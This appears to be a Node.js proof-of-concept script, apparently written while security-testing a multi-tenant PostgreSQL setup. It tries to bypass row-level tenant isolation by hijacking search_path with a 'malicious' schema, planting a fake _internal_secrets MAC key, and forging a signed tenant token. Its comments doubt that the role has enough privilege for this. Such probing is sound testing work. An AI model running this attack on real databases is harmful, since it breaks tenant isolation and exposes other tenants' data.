const { Pool } = require('pg');
const pool = new Pool({ user: 'u0_a338', host: '127.0.0.1', database: 'postgres', port: 5432 });

async function run() {
    const client = await pool.connect();
    try {
        await client.query("SET ROLE gateway_role");
        await client.query("SET app.current_tenant = '00000000-0000-0000-0000-000000000001'");
        let res = await client.query("SELECT count(*) FROM requests");
        console.log("Without token:", res.rows[0].count);

        await client.query("SET app.tenant_token = '00000000-0000-0000-0000-000000000001.invalid_sig'");
        res = await client.query("SELECT count(*) FROM requests");
        console.log("With invalid token:", res.rows[0].count);
        
        // Try to hijack search path for get_current_tenant() if it calls other functions
        await client.query("CREATE SCHEMA IF NOT EXISTS malicious");
        await client.query("SET search_path TO malicious, public");
        // Wait, get_current_tenant uses `current_setting`, `split_part`, `hmac`, `encode`.
        // If they are not schema-qualified, we can't shadow them because pg_catalog is always searched first.
        // What about `_internal_secrets`? It's not schema qualified, so it uses search_path.
        // Wait, if _internal_secrets is in public, but `malicious` is before `public`, we could create a malicious `_internal_secrets` table!
        await client.query("CREATE TABLE malicious._internal_secrets (key TEXT, value TEXT)");
        await client.query("INSERT INTO malicious._internal_secrets VALUES ('tenant_mac_key', 'my_secret')");
        
        await client.query("SET app.tenant_token = '00000000-0000-0000-0000-000000000001.my_signature'");
        // Wait, gateway_role can't CREATE SCHEMA or TABLE. Let's see if it works.
    } catch(e) {
        console.log("Error:", e.message);
    } finally {
        client.release();
        pool.end();
    }
}
run();
